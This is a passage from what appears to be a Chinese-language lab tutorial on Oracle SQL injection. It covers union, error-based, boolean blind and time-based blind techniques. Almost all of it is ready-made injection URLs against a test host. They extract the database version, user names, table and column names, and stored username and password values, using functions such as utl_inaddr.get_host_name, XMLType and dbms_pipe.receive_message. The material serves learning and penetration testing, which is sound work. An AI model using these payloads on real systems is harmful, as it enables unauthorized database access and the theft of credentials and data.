<h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取数据库版本</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select banner from sys.v_$version where rownum=1 ),&#x27;3&#x27; from dual --+		</span><br><span class="line"></span><br><span class="line">获取数据库的实例名(SYS用户才可查询)</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select instance_name from v_$instance),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>

<h3 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h3><p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取第一个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取第二个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1 and username&lt;&gt;&#x27;SYS&#x27;),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取当前用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(SELECT user FROM dual),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取TEST用户的第一张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),&#x27;3&#x27; from dual --+</span><br><span class="line"></span><br><span class="line">获取TEST用户的第二张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27; and table_name&lt;&gt;&#x27;NEWS&#x27;),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取TEST用户的USERS表的第一个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取TEST用户的USERS表的第二个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1 and column_name&lt;&gt;&#x27;ID&#x27;),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>

<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select concat(concat(username,&#x27;~~&#x27;),password) from users where rownum=1),null from dual --+	</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在oracle注入时候出现了数据库报错信息，可以优先选择报错注入，使用报错的方式将查询数据的结果带出到错误页面中。</p>
<p>使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可），类似mssql报错注入的方式。</p>
<h3 id="utl-inaddr-get-host-name-函数报错注入"><a href="#utl-inaddr-get-host-name-函数报错注入" class="headerlink" title="utl_inaddr.get_host_name()函数报错注入"></a>utl_inaddr.get_host_name()函数报错注入</h3><p><code>utl_inaddr.get_host_address</code> 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。</p>
<p>我们传递的是一个sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>

<h3 id="ctxsys-drithsx-sn-函数报错注入"><a href="#ctxsys-drithsx-sn-函数报错注入" class="headerlink" title="ctxsys.drithsx.sn()函数报错注入"></a>ctxsys.drithsx.sn()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-checkin-函数报错注入"><a href="#dbms-xdb-version-checkin-函数报错注入" class="headerlink" title="dbms_xdb_version.checkin()函数报错注入"></a>dbms_xdb_version.checkin()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-makeversioned-函数报错注入"><a href="#dbms-xdb-version-makeversioned-函数报错注入" class="headerlink" title="dbms_xdb_version.makeversioned()函数报错注入"></a>dbms_xdb_version.makeversioned()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-uncheckout-函数报错注入"><a href="#dbms-xdb-version-uncheckout-函数报错注入" class="headerlink" title="dbms_xdb_version.uncheckout()函数报错注入"></a>dbms_xdb_version.uncheckout()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-utility-sqlid-to-sqlhash-函数报错注入"><a href="#dbms-utility-sqlid-to-sqlhash-函数报错注入" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()函数报错注入"></a>dbms_utility.sqlid_to_sqlhash()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="ordsys-ord-dicom-getmappingxpath-函数报错注入"><a href="#ordsys-ord-dicom-getmappingxpath-函数报错注入" class="headerlink" title="ordsys.ord_dicom.getmappingxpath()函数报错注入"></a>ordsys.ord_dicom.getmappingxpath()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="XMLType-函数报错注入"><a href="#XMLType-函数报错注入" class="headerlink" title="XMLType()函数报错注入"></a>XMLType()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select username from test.users where rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><h3 id="decode-函数布尔盲注"><a href="#decode-函数布尔盲注" class="headerlink" title="decode()函数布尔盲注"></a>decode()函数布尔盲注</h3><p><code>decode(字段或字段的运算，值1，值2，值3）</code></p>
<p>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3。</p>
<p>当然值1，值2，值3也可以是表达式，这个函数使得某些sql语句简单了许多。</p>
<p>使用方法：</p>
<p>比较大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值</span><br></pre></td></tr></table></figure>

<p>sign()函数根据某个值是0、正数还是负数，分别返回0、1、-1</p>
<p>例如：</p>
<p>变量1=10，变量2=20，则<code>sign(变量1-变量2)</code>返回-1，decode解码结果为“变量1”，达到了取较小值的目的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> decode(sign(<span class="number">10</span><span class="number">-20</span>),<span class="number">-1</span>,<span class="number">10</span>,<span class="number">20</span>) <span class="keyword">from</span> dual;                   </span><br></pre></td></tr></table></figure>



<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断是否是TEST用户</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(user,&#x27;TEST&#x27;,1,0) from dual) --+</span><br><span class="line"></span><br><span class="line">也可利用substr()函数进行逐一猜解</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;T&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;N&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1),&#x27;I&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select username from test.users where rownum=1),1,1),&#x27;a&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<h3 id="instr-函数布尔盲注"><a href="#instr-函数布尔盲注" class="headerlink" title="instr()函数布尔盲注"></a>instr()函数布尔盲注</h3><p>instr函数的使用，从一个字符串中查找指定子串的位置。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> instr(<span class="string">&#x27;abcdef123de&#x27;</span>,<span class="string">&#x27;de&#x27;</span>) position <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056394.png" alt="043da52fbdd3d786b78a7384caa9c6c7.png"></p>
<p>从1开始算 de排第四所以返回4</p>
<p><strong>布尔盲注中的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;S&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SY&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SYS&#x27;))=1 --+</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h3 id="substr-函数布尔盲注"><a href="#substr-函数布尔盲注" class="headerlink" title="substr()函数布尔盲注"></a>substr()函数布尔盲注</h3><p><strong>获取数据长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select length(user) from dual)=3 --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解ASCII码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ascii(substr(user,1,1))from dual)&gt;65 --+</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>oracle注入中可以通过页面响应的状态，这里指的是响应时间，通过这种方式判断SQL是否被执行的方式，便是时间盲注。</p>
<p>oracle的时间盲注通常使用<code>DBMS_PIPE.RECEIVE_MESSAGE()</code>，而另外一种便是<code>decode()</code>与高耗时SQL操作的组合，当然也可以是case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：<code>(select count(*) from all_objects)</code>，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p>
<h3 id="dbms-pipe-receive-message-函数时间盲注"><a href="#dbms-pipe-receive-message-函数时间盲注" class="headerlink" title="dbms_pipe.receive_message()函数时间盲注"></a>dbms_pipe.receive_message()函数时间盲注</h3><p><code>DBMS_LOCK.SLEEP()</code>函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。</p>
<p>首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。其次，只有数据库管理员才能使用<code>DBMS_LOCK</code>包。</p>
<p>在Oracle PL/SQL中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：</p>
<p><code>dbms_pipe.receive_message(&#39;RDS&#39;, 10)</code></p>
<p><code>DBMS_PIPE.RECEIVE_MESSAGE()</code>函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以<code>public</code>权限执行该包。<code>DBMS_LOCK.SLEEP()</code>与之相反，它是一个可以用在SQL语句中的函数。</p>
<p><strong>查看是否可以使用dbms_pipe.receive_message()函数进行延时注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(dbms_pipe.receive_message(&#x27;RDS&#x27;,5)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/img/gif/loading4.gif" data-original="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056362.png" alt="c73218c0384317c32b1796c080b43cad.png"></p>
<p>来自官网的DBMS_PIPE.RECEIVE_MESSAGE语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE (</span><br><span class="line">   pipename     IN VARCHAR2,</span><br><span class="line">   timeout      IN INTEGER      DEFAULT maxwait)</span><br><span class="line">RETURN INTEGER;</span><br></pre></td></tr></table></figure>

<p><strong>具体payload构造：</strong></p>
<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(user as varchar(4000)),chr(32)) from dual),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(table_name as varchar(4000)),chr(32)) from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(column_name as varchar(4000)),chr(32)) from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(username as varchar(4000)),chr(32)) from test.users where rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<h3 id="decode-函数时间盲注"><a href="#decode-函数时间盲注" class="headerlink" title="decode()函数时间盲注"></a>decode()函数时间盲注</h3><p><code>（select count(*) from all_objects)</code>会花费更多时间去查询所有数据库的条目。不过在使用的过程中有很多不尽如人意的地方，有时候加载快有时加载慢。</p>
<p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual)</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h3 id="decode-与dbms-pipe-receive-message-嵌套时间盲注"><a href="#decode-与dbms-pipe-receive-message-嵌套时间盲注" class="headerlink" title="decode()与dbms_pipe.receive_message()嵌套时间盲注"></a>decode()与dbms_pipe.receive_message()嵌套时间盲注</h3><p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;, 5),0) from dual)</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
